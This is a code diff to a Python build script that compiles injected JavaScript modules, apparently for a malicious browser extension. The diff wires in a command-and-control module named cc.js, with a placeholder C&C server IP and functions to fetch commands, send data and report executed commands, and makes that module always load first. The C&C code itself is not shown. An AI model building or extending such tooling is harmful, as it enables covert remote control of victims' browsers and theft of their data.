@@ -20,9 +20,9 @@ modules_args = {
 	b'{{CC_SERVER_IP_ADDR}}': b'', # Defined by user.
 	# This is here to make the following lines work:
 	# let getCmds = {{CC_GET_CMDS_FN}}; let sendData = {{CC_SEND_DATA_FN}};
-	b'{{CC_GET_CMDS_FN}}': b'getCmds', # function name is constant, defined in cc.js
-	b'{{CC_SEND_DATA_FN}}': b'sendData', # function name is constant, defined in cc.js
-	b'{{CC_EXECUTED_CMD_FN}}': b'executedCmd' # function name is constant, defined in cc.js
+	b'{{CC_GET_CMDS_FN}}': b'getCmdsCC', # function name is constant, defined in cc.js
+	b'{{CC_SEND_DATA_FN}}': b'sendDataCC', # function name is constant, defined in cc.js
+	b'{{CC_EXECUTED_CMD_FN}}': b'executedCmdCC' # function name is constant, defined in cc.js
 }
 
 def main():
@@ -68,7 +68,7 @@ def compile(args):
 
 	# 4. Collecting necessary modules.
 	modules_list = args.modules
-	mods_used = []
+	mods_used = ['cc.js'] # Always add the C&C module first.
 	fill_modules_args(args)
 	for m in modules_list:
 		if m in modules_dict:
@@ -79,7 +79,10 @@ def compile(args):
 	# 5. JS total file generation.
 	js_injected = b''
 	for mu in mods_used:
-		js_injected += b'\n{\n' + get_module(mu, args=args) + b'\n};\n'
+		if (mu == 'cc.js'):
+			js_injected += b'\n\n' + get_module(mu, args=args) + b'\n\n'
+		else:
+			js_injected += b'\n{\n' + get_module(mu, args=args) + b'\n};\n'
 		js_injected += b'; /* Modules seperator */ ; \r\n'
 
 	# 6. Manifest generation (if required).
